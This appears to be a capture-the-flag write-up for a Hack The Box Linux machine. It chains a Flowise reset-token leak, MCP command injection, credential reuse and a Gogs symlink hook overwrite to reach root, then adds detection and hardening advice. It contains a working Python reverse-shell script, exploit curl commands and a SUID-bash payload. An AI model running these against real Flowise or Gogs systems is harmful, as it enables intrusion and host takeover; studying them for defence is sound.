# Silentium

```
Difficulty: Easy
Operating System: Linux
Hints: True
```

## Summary of Attack Chain

| Step | User / Access          | Technique Used                            | Result                                                                                                            |
| :--: | :--------------------- | :---------------------------------------- | :---------------------------------------------------------------------------------------------------------------- |
|   1  | Local / Recon          | **Nmap Port Scan & OSINT**                | Discovered open ports `22` and `80`; identified Flowise application and inferred admin email `ben@silentium.htb`. |
|   2  | Unauthenticated Web    | **Token Disclosure (CVE-2025-58434)**     | Queried `/forgot-password` endpoint and extracted `tempToken` directly from JSON response.                        |
|   3  | Unauthenticated Web    | **Password Reset / Auth Bypass**          | Used leaked token to reset admin password and obtain valid JWT for Flowise API.                                   |
|   4  | ben (Flowise Admin)    | **MCP Command Injection**                 | Injected Python reverse shell payload into `customMCP` node parameters, bypassing input sanitization.             |
|   5  | root (Container Shell) | **Payload Adaptation**                    | Achieved code execution in Alpine container using Python socket reverse shell (no `bash`).                        |
|   6  | root (Container Shell) | **Environment Variable Disclosure**       | Read `/proc/1/environ` and extracted plaintext `SMTP_PASSWORD` (`r04XXXXXXXX`).                                   |
|   7  | ben (Host OS)          | **Credential Reuse / SSH Pivot**          | Reused SMTP password to authenticate via SSH as `ben` on the host machine.                                        |
|   8  | ben (Host OS)          | **Internal Service Enumeration**          | Discovered internal **Gogs** instance running as `root` on port `3001`.                                           |
|   9  | ben (Gogs API)         | **Symlink Bypass (CVE-2025-8110)**        | Created malicious symlink (`evil.link`) pointing to Git `pre-receive` hook path.                                  |
|  10  | ben (Gogs API)         | **API File Overwrite**                    | Used API `PUT` request to overwrite the `pre-receive` hook via symlink manipulation.                              |
|  11  | ben (Host OS)          | **Hook Execution via Git Push**           | Triggered hook execution by pushing a dummy commit (`pwn.txt`), executing payload as root.                        |
|  12  | root                   | **Privilege Escalation (SUID Execution)** | Executed `/tmp/rootbash -p` to gain persistent root shell and retrieve **root.txt**.                              |


![Silentium](htb_Silentium_Mindmap.png)


# Offensive Operations

## 1: Reconaissance

```bash
nmap -sC -sV -p- target_ip
```

[Nmap Results](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Silentium/nmap_results.nmap "Results")


| Port | Service | Version |
| - | - | - |
| 22 | SSH | OpenSSH |
| 80 | HTTP | nginx |

Here is a concise summary of our full-port Nmap scan:

**Target Overview**
* **IP Address:** `10.129.86.139`
* **Hostname:** `staging.silentium.htb`
* **Operating System:** Ubuntu Linux

**Open Ports & Services**

* **Port 22 (SSH):** Running OpenSSH 9.6p1. This is a modern, secure version, meaning it is highly unlikely to be vulnerable to direct exploitation. It will likely require valid credentials or an SSH key to access.
* **Port 80 (HTTP):** Running nginx 1.24.0. This is the primary attack surface. 
    * **Application Identified:** The HTTP title reveals the application running is **"Flowise - Build AI Agents, Visually"**

![Silentium](htb_Silentium_web.png)

```bash
target_ip silentium.htb staging.silentium.htb staging-v2-code.dev.silentium.htb
```

![Silentium](htb_Silentium_subd.png)

##  1.1 The Information Leak (Flowise)

The entry point was **Flowise 3.0.5**, an open-source tool for building AI workflows.

### 1.2 Credential Harvesting

Attackers often look for "About Us" or "Leadership" pages to build a target list. Finding **Ben** on the main site allowed We to guess the admin email: `ben@silentium.htb`.

```
Marcus Thorne - Managing Director
Ben - Head of Financial Systems
Elena Rossi - Chief Risk Officer
```
![Silentium](htb_Silentium_leadership.png)

![Silentium](htb_Silentium_staging_leadership.png)
![Silentium](htb_Silentium_staging_forgot.png)
![Silentium](htb_Silentium_staging_forgot_pass_chn.png)

Combining the username `Ben` with the domain `silentium.htb`, we infer the email address `ben@silentium.htb`. This turns out to be the Flowise admin account.


### 1.3 CVE-2025-58434: Token Disclosure

This is a critical logic flaw. When requesting a password reset, the application should only send the token via email. Instead, the API endpoint `/api/v1/account/forgot-password` returned the sensitive token in the **JSON response body** itself. 

> **Note**: This endpoint is under `/api/v1/account/`, and does NOT require the `x-request-from: internal` header.

```bash
# Request password reset (no authentication required)
curl -s -X POST 'http://staging.silentium.htb/api/v1/account/forgot-password' \
  -H 'Content-Type: application/json' \
  -d '{"user":{"email":"ben@silentium.htb"}}'
```
![Silentium](htb_Silentium_staging_forgot_pass_chn_token.png)

The response leaks `tempToken`, user ID, bcrypt hash, and more:

```json
{
  "user": {
    "id": "e26c9d6c-...",
    "email": "ben@silentium.htb",
    "credential": "$2a$05$...",
    "tempToken": "<RESET_TOKEN>",
    "tokenExpiry": "2026-..."
  }
}
```

Use the token to reset the password:

```bash
curl -s -X POST 'http://staging.silentium.htb/api/v1/account/reset-password' \
  -H 'Content-Type: application/json' \
  -d '{"user":{"email":"ben@silentium.htb","tempToken":"<RESET_TOKEN>","password":"z0nSec!"}}'
```

Authenticate to the API using the newly reset password. Note that while Flowise sets a session cookie, the API relies on the JWT access token returned in the JSON response.


> **The Pivot:** By capturing this response, We bypassed the need to access Ben's actual email inbox, allowed We to reset his password and log in as an administrator.

```bash
curl -s -X POST 'http://staging.silentium.htb/api/v1/auth/login' \
  -H 'Content-Type: application/json' \
  -H 'x-request-from: internal' \
  -d '{"email":"ben@silentium.htb","password":"z0nSec!"}'
```

![Silentium](htb_Silentium_staging_forgot_pass_chn__done.png)

![Silentium](htb_Silentium_staging_ben_login.png)

![Silentium](htb_Silentium_staging_ben_auth.png)

![Silentium](htb_Silentium_staging_ben_login_portal.png)

##  2: From Admin to RCE (MCP Injection)

Once inside Flowise, We exploited the **Model Context Protocol (MCP)** feature. MCP allows AI agents to connect to external tools by executing commands.

### 2.1 Custom MCP Node

The `customMCP` node takes a `command` and `args`. Because the application didn't sanitize these inputs, We were able to pass a Python reverse shell payload. 

```python
import requests
import json
import urllib3

# Suppress insecure request warnings if using proxies later
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#  Configuration 
TARGET_URL = 'http://staging.silentium.htb'
EMAIL = 'ben@silentium.htb'
PASSWORD = 'z0nSec!'
TunIP = '10.10.X.X'  # Replace with our tun0 IP
Tun_Port = 9001

s = requests.Session()
s.headers.update({
    'x-request-from': 'internal',
    'Content-Type': 'application/json'
})

print("[*] Authenticating to Flowise API...")
login_resp = s.post(f'{TARGET_URL}/api/v1/auth/login', json={'email': EMAIL, 'password': PASSWORD})

if login_resp.status_code == 200:
    # Extract the JWT required for API endpoints
    token = login_resp.json().get('token')
    s.headers.update({'Authorization': f'Bearer {token}'})
    print("[+] Authentication successful! JWT injected into session.")
else:
    print(f"[-] Authentication failed. Check credentials.\nResponse: {login_resp.text}")
    exit()

# RCE function leveraging the customMCP logic flaw
def rce(cmd):
    print(f"[*] Triggering MCP Command Injection payload...")
    mcp_config = json.dumps({"command": "sh", "args": ["-c", cmd]})
    try:
        s.post(f'{TARGET_URL}/api/v1/node-load-method/customMCP',
            json={
                "loadMethod": "listActions",
                "inputs": {"mcpServerConfig": mcp_config}
            },
            timeout=5) # Expecting a timeout since the shell will hang the connection
    except requests.exceptions.ReadTimeout:
        print("[+] Request timed out. Check you netcat listener for the shell!")
    except Exception as e:
        print(f"[-] Unexpected error: {e}")

# Reverse shell payload (Alpine Linux compatible - no bash)
payload = (
    f"python3 -c 'import socket,subprocess,os;"
    f"s=socket.socket();s.connect((\"{TunIP}\",{Tun_Port}));"
    f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
    f"subprocess.call([\"/bin/sh\",\"-i\"])'"
)

rce(payload)
```


[shell.py](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Silentium/shell.py "Results")


* **Constraint:** The container used **Alpine Linux**. Standard payloads often fail here because Alpine uses `ash` instead of `bash`, and many common utilities are missing.
* **Solution:** We used a Python3 one-liner to spawn a socket and duplicate the file descriptors to `/bin/sh`.



##  3: Escape & Horizontal Movement

We landed as `root` inside a Docker container, but "Root in a container" is often a sandbox. 

### 3.1 Environment Variable Leaks

Inside Docker, sensitive configuration is often passed via environment variables. By checking `/proc/1/environ`, We found the `SMTP_PASSWORD`: `r04XXXXXXXX`.

![Silentium](htb_Silentium_staging_ben_revshell_doc_findingns.png)

![Silentium](htb_Silentium_network_enum.png)

[env_leaks](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Silentium/env_leaks "Results")


![Silentium](htb_Silentium_network_sqlite.png)

[db.sqlite](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Silentium/db.sqlite "Results")


### 3.2 Password Reuse

A common administrative mistake is using the same password for service accounts and system users. This password worked for the user **ben** on the host machine via SSH, allowing We to move from the container to the actual Ubuntu host.

```bash
ssh ben@target_ip
# Password: r04XXXXXXXX
```

![Silentium](htb_Silentium_user_flag_.png)


```bash
ss -tlnp
```

```
127.0.0.1:3001 → Gogs 0.13.3 (Git service)
127.0.0.1:3000 → Flowise (Docker container)
127.0.0.1:8025 → MailHog Web
127.0.0.1:1025 → MailHog SMTP
```


##  4: Root via Gogs Symlink Bypass (CVE-2025-8110)

This is the most technical part of the chain. **Gogs** (a Git service) was running as **root**, which is a high-risk configuration.

```bash
ps aux | grep gogs
# root 1529 /opt/gogs/gogs/gogs web
```

![Silentium](htb_Silentium_for_.png)

![Silentium](htb_Silentium_internal_.png)

Key settings:

```ini
RUN_USER = root
HTTP_ADDR = 127.0.0.1
HTTP_PORT = 3001
DOMAIN = staging-v2-code.dev.silentium.htb

[repository]
ROOT_PATH = /root/gogs-repositories

[security]
SECRET_KEY = sdsrXXXXXXXXXXX

[auth]
DISABLE_REGISTRATION = false
ENABLE_REGISTRATION_CAPTCHA = true
```
![Silentium](htb_Silentium_appini.png)

![Silentium](htb_Silentium_hackpng.png)
![Silentium](htb_Silentium_token.png)

### 4.1 The Vulnerability
The Gogs `PutContents` API (used to update files in a repository) did not check if the file it was writing to was a **symbolic link**. If We commit a symlink to a repo, Gogs will "follow" that link on the server's local disk when We try to update the file via the API.

[REPO.tar](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Silentium/REPO.tar "Results")

### 4.2 The Exploit Logic

Wer terminal logs show We executed the following sequence:

[intr.txt](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Silentium/intr.txt "Results")

1.  **Symlink Creation:** We created a symlink named `evil.link` pointing to the server's internal Git hook path: 
    `/root/gogs-repositories/hacker/repo.git/hooks/pre-receive`.
2.  **API Overwrite:** We used a `PUT` request to the Gogs API to "update" `evil.link`. Because Gogs followed the link, it actually overwrote the server's `pre-receive` hook file with Wer malicious bash script.
3.  **The Payload:** Wer script created a copy of `/bin/bash` in `/tmp/rootbash` and set the **SUID bit** (`chmod +s`).



### 4.3 Triggering the Hook
Git hooks (like `pre-receive`) execute automatically when a `git push` occurs. 
* We pushed a dummy file (`pwn.txt`).
* The server attempted to run the `pre-receive` hook to process the push.
* Instead of the normal Git logic, it executed Wer script as **root**.

```Attacker
┌──(z0n㉿0x0z0n)-[~/z0n/z0n/posts/Silentium/REPO]   
└─$ git add evil.link                               
                                                    
┌──(z0n㉿0x0z0n)-[~/z0n/z0n/posts/Silentium/REPO]   
└─$ git commit -m "fix case sensitivity"            
[master 3115c54] fix case sensitivity               
 1 file changed, 1 insertion(+), 1 deletion(-)      
                                                    
┌──(z0n㉿0x0z0n)-[~/z0n/z0n/posts/Silentium/REPO]   
└─$ git push                                        
Enumerating objects: 5, done.                       
Counting objects: 100% (5/5), done.                 
Delta compression using up to 16 threads            
Compressing objects: 100% (3/3), done.              
Writing objects: 100% (3/3), 304 bytes | 304.00 KiB/s, done.                                                                                     
Total 3 (delta 1), reused 0 (delta 0), pack-reused 0 (from 0) 
Username for 'http://staging-v2-code.dev.silentium.htb:3001': hacker   
Password for 'http://hacker@staging-v2-code.dev.silentium.htb:3001': 
To http://staging-v2-code.dev.silentium.htb:3001/hacker/REPO.git      
   cfcebd0..3115c54  master -> master               
                                                    
┌──(z0n㉿0x0z0n)-[~/z0n/z0n/posts/Silentium/REPO]   
└─$ curl -s -H "Authorization: token d1440fd6b5a3c4b26f2fdec708605370b0a74946" \ 
http://staging-v2-code.dev.silentium.htb:3001/api/v1/repos/hacker/REPO/contents/evil.link                                  
{"type":"symlink","target":"/root/gogs-repositories/hacker/repo.git/hooks/pre-receive","size":57,"name":"evil.link","path":"evil.link","sha":"46b6d47c0dd87d53cd0e618f050973ed794496f7","url":"http://staging-v2-code.dev.silentium.htb:3001/api/v1/repos/ha
cker/REPO/contents/evil.link","git_url":"","html_url":"http://staging-v2-code.dev.silentium.htb:3001/hacker/REPO/src/master/evil.link","download_url":"http://staging-v2-code.dev.silentium.htb:3001/hacker/REPO/raw/master/evil.link","_links":{"git":"","s
elf":"http://staging-v2-code.dev.silentium.htb:3001/api/v1/repos/hacker/REPO/contents/evil.link","html":"http://staging-v2-code.dev.silentium.htb:3001/hacker/REPO/src/master/evil.link"}}[ble: EOF]                        

┌──(z0n㉿0x0z0n)-[~/z0n/z0n/posts/Silentium/REPO]
└─$ curl -X PUT -H "Authorization: token d1440fd6b5a3c4b26f2fdec708605370b0a74946" \
-H "Content-Type: application/json" \
-d '{
  "message": "Overwrite hook",
  "content": "IyEvYmluL3NoCmNwIC9iaW4vYmFzaCAvdG1wL3Jvb3RiYXNoCmNobW9kIDQ3NTUgL3RtcC9yb290YmFzaAo=",
  "sha": "46b6d47c0dd87d53cd0e618f050973ed794496f7"
}' \
http://staging-v2-code.dev.silentium.htb:3001/api/v1/repos/hacker/REPO/contents/evil.link
{"commit":{"url":"http://staging-v2-code.dev.silentium.htb:3001/api/v1/repos/hacker/REPO/contents/evil.link","sha":"3115c5451d7087a67f0ab3d63af724105994342b","html_url":"http://staging-v2-code.dev.silentium.htb:3001/hacker/REPO/commits/3115c5451d7087a67f0ab3d63af724105994342b","commit":{"url":"http://staging-v2-code.dev.silentium.htb:3001/api/v1/repos/hacker/REPO/contents/evil.link","author":{"name":"z0n","email":"hhorizon97@gmail.com","date":"2026-04-12T04:03:31Z"},"committer":{"name":"z0n","email":"hhorizon97@gmail.com","date":"2026-04-12T04:03:31Z"},"message":"fix case sensitivity","tree":{"url":"http://staging-v2-code.dev.silentium.htb:3001/api/v1/repos/hacker/REPO/tree/3115c5451d7087a67f0ab3d63af724105994342b","sha":"3115c5451d7087a67f0ab3d63af724105994342b"}},"author":null,"committer":null,"parents":[{"url":"http://staging-v2-code.dev.silentium.htb:3001/api/v1/repos/hacker/REPO/commits/cfcebd0cd5e1bb379b7bb0a8163d0d1b41e9d938","sha":"cfcebd0cd5e1bb379b7bb0a8163d0d1b41e9d938"}]},"content":{"type":"symlink","target":"/root/gogs-repositories/hacker/repo.git/hooks/pre-receive","size":57,"name":"evil.link","path":"evil.link","sha":"46b6d47c0dd87d53cd0e618f050973ed794496f7","url":"http://staging-v2-code.dev.silentium.htb:3001/api/v1/repos/hacker/REPO/contents/evil.link","git_url":"","html_url":"http://staging-v2-code.dev.silentium.htb:3001/hacker/REPO/src/master/evil.link","download_url":"http://staging-v2-code.dev.silentium.htb:3001/hacker/REPO/raw/master/evil.link","_links":{"git":"","self":"http://staging-v2-code.dev.silentium.htb:3001/api/v1/repos/hacker/REPO/contents/evil.link","html":"http://staging-v2-code.dev.silentium.htb:3001/hacker/REPO/src/master/evil.link"}}}[ble: EOF]                                                      

┌──(z0n㉿0x0z0n)-[~/z0n/z0n/posts/Silentium/REPO]
└─$ echo "pwned" > pwn.txt

┌──(z0n㉿0x0z0n)-[~/z0n/z0n/posts/Silentium/REPO]
└─$ git add pwn.txt

┌──(z0n㉿0x0z0n)-[~/z0n/z0n/posts/Silentium/REPO]
└─$ git commit -m "trigger root payload"
[master ea18114] trigger root payload
 1 file changed, 1 insertion(+)
 create mode 100644 pwn.txt

┌──(z0n㉿0x0z0n)-[~/z0n/z0n/posts/Silentium/REPO]
└─$ git push
Enumerating objects: 4, done.
Counting objects: 100% (4/4), done.
Delta compression using up to 16 threads
Compressing objects: 100% (2/2), done.
Writing objects: 100% (3/3), 272 bytes | 272.00 KiB/s, done.
Total 3 (delta 1), reused 0 (delta 0), pack-reused 0 (from 0)
Username for 'http://staging-v2-code.dev.silentium.htb:3001': hacker
Password for 'http://hacker@staging-v2-code.dev.silentium.htb:3001': 
To http://staging-v2-code.dev.silentium.htb:3001/hacker/REPO.git
   3115c54..ea18114  master -> master
```

![Silentium](htb_Silentium_exp.png)

![Silentium](htb_Silentium_git_act.png)

## Final Flag Capture

Once the hook fired, the SUID binary was created. We then used the `-p` flag to ensure bash didn't drop the root privileges:

```bash
ben@silentium:/opt/gogs$ ls -la /tmp/rootbash       
-rwsr-xr-x 1 root root 1446024 Apr 11 21:04 /tmp/rootbash
ben@silentium:/opt/gogs$ /tmp/rootbash -p 
rootbash-5.2# cat /root/root.txt
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

![Silentium](htb_Silentium_root_flag.png)


# Defensive Operations

## Strategic Overview

* **1.1 Definition:** Exploitation of application-layer logic flaws within AI orchestration workflows (Flowise) combined with Git service misconfigurations (Gogs) to achieve container escape and full host compromise.
* **1.2 Impact:** Complete Host OS takeover, culminating in unauthenticated root-level persistence via malicious Git hooks.
* **1.3 The Scenario:** An adversary leverages an unauthenticated information leak in an exposed Flowise instance to extract password reset tokens. This access is utilized to inject malicious Model Context Protocol (MCP) parameters, achieving Remote Code Execution (RCE) within an Alpine Docker container. Post-exploitation enumeration reveals leaked environment variables, enabling horizontal movement to the host OS via SSH password reuse. Final privilege escalation is achieved by exploiting a symlink bypass vulnerability in a Gogs instance running under the root context.



## System Architecture & Theory

* **2.1 Protocol Environment:** HTTP/REST APIs (Flowise, Gogs), Docker (Alpine Linux base), SSH, and local Git version control subroutines.
* **2.2 Attack Logic Flow:**
> [Flowise Password Reset Leak] -> [MCP Command Injection] -> [Container Env Leak] -> [SSH Horizontal Pivot] -> [Gogs API Symlink Bypass] -> [Git pre-receive Hook Overwrite] -> [Root SUID Generation]

* **2.3 Theoretical Analogy:** A cascading authentication collapse. The adversary bypasses the perimeter by intercepting a poorly-handled digital master key, escapes the internal quarantine module by discovering administrative credentials abandoned on a clipboard, and finally tricks the facility’s automated maintenance system into installing a permanent, unauthorized access door.



## Attack Vector (Mechanics)

### Core Mechanism

| Attribute                  | Technical Details                                                                                                                                                                                                                                                                                                                                                                     |
| :------------------------- | :------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **Primary Identifiers**    | Flowise API `/api/v1/account/forgot-password`, Gogs API `/api/v1/repos/.../contents`, Git hook `pre-receive`.                                                                                                                                                                                                                                                                         |
| **Critical Vulnerability** | Unauthenticated token disclosure (**CVE-2025-58434**) and improper symlink validation in **Gogs** (**CVE-2025-8110**).                                                                                                                                                                                                                                                                |
| **Offensive Action**       | 1. Extract reset token from API response.<br><br>2. Reset admin password and gain API access.<br><br>3. Inject reverse shell via MCP node.<br><br>4. Extract credentials from `/proc/1/environ`.<br><br>5. Pivot via SSH using reused credentials.<br><br>6. Create symlink to Git hook.<br><br>7. Overwrite hook via API.<br><br>8. Trigger execution via `git push` to obtain root. |

### Prerequisites

* **Access Level:** Unauthenticated network access to the target web services.
* **Connectivity:** TCP 80 (HTTP for Flowise), TCP 22 (SSH), TCP 3001 (HTTP for Gogs).
* **Target State:** Flowise version vulnerable to token leakage; Gogs configured with `RUN_USER = root`; administrative password reuse across container environments and host OS user accounts.



## Threat Hunting & Anomaly Analysis

* **Hunt Hypothesis:** Adversaries leveraging AI workflow platforms for initial access will spawn anomalous shell child processes from containerized environments, followed by unauthorized modifications to executable Git hook scripts on the host file system.
* **Behavioral Outliers:** The `docker-containerd` or application daemon spawning a Python interpreter that immediately executes a one-liner `socket` connection and duplicates file descriptors (`dup2`). Furthermore, any modification to a `.git/hooks/` directory originating from a web service API process rather than a standard developer terminal session is highly anomalous.
* **Toxic Combinations:** The execution of version control services (Gogs) under the `root` context combined with the storage of cleartext SMTP credentials in container environment variables.

[Evidence](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Silentium/loot_silentium_20260411.tar.gz "Results")

## Detection Engineering 

* **Telemetry Gap Analysis:** Visibility requires Sysmon for Linux (or Auditd/eBPF equivalents) monitoring Event ID 1 (Process Creation) for anomalous shell execution, Event ID 3 (Network Connection) for reverse shell egress, and Event ID 11 (File Create/Modify) targeting `.git/hooks/*`.
* **Detection-as-Code (KQL):**
```kql
// Detect anomalous Git Hook modification indicative of CVE-2025-8110 exploitation
let SuspiciousPaths = dynamic([".git/hooks/pre-receive", ".git/hooks/post-receive", ".git/hooks/pre-commit"]);
DeviceFileEvents
| where ActionType in ("FileCreated", "FileModified", "FileRenamed")
| where FolderPath has_any (SuspiciousPaths)
| where InitiatingProcessFileName in ("gogs", "gitea", "nginx", "apache2")
| project Timestamp, DeviceName, ActionType, FolderPath, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessAccountName
```

* **Resilience Test:** An adversary may bypass filesystem monitoring by executing their payload entirely in memory or utilizing living-off-the-land techniques that do not require modifying the hook file directly. **Sub-rule:** Implement behavioral monitoring for any process executed by the `gogs` binary that spawns `bash`, `sh`, or `chmod` with the SUID bit flag (`4755` or `+s`).



## Toolkit & Implementation

* **Automation:** Standard offensive utilities including `curl` for API manipulation, Python `requests` for automated injection, standard Git client binaries, and `netcat` for reverse shell handlers.
* **OPSEC Analysis:** The attack leaves a significant footprint. The reverse shell payload traverses the network in plaintext. The Gogs exploit requires creating an anomalous repository file (`evil.link`) and leaves the overwritten `pre-receive` hook on disk. To maintain operational security, the adversary must meticulously clean the repository history and restore the original hook post-exploitation.
* **Post-Exploitation:** The creation of an SUID binary (`/tmp/rootbash`) acts as a quiet persistence mechanism, allowing the adversary to escalate from the `ben` user to `root` at will without altering `/etc/passwd`, modifying `sudoers`, or dropping SSH keys.



## Defensive Mitigation

* **Technical Hardening:** 1. Update Flowise to a patched iteration that does not leak reset tokens in the response body.
    2. Reconfigure Gogs to execute under a dedicated, low-privilege service account (e.g., `git`) by modifying `RUN_USER` in `app.ini`.
    3. Transition container secrets from environment variables to secure vault mechanisms (e.g., Docker Secrets or HashiCorp Vault).
    4. Implement strict Egress filtering on the container network to prevent outbound reverse shells.
* **Personnel Focus:** Enforce mandatory password differentiation between container service dependencies (SMTP) and Active Directory/Local interactive user accounts. 



## Quick-Action Playbook

|  Step  | Objective                          | Technical Command / Logic                                                                                                                                                                                                         |
| :----: | :--------------------------------- | :-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **01** | **Enumerate (Token Leak)**         | `curl -s -X POST 'http://staging.silentium.htb/api/v1/account/forgot-password' -H 'Content-Type: application/json' -d '{"user":{"email":"ben@silentium.htb"}}'`                                                                   |
| **02** | **Exploit (Symlink Overwrite)**    | `curl -X PUT -H "Authorization: token [TOKEN]" -H "Content-Type: application/json" -d '{"message":"Overwrite hook","content":"[Base64_Payload]","sha":"[SHA]"}' http://[TARGET]:3001/api/v1/repos/hacker/REPO/contents/evil.link` |
| **03** | **Privilege Escalation / Persist** | `/tmp/rootbash -p`                                                                                                                                                                                                                |
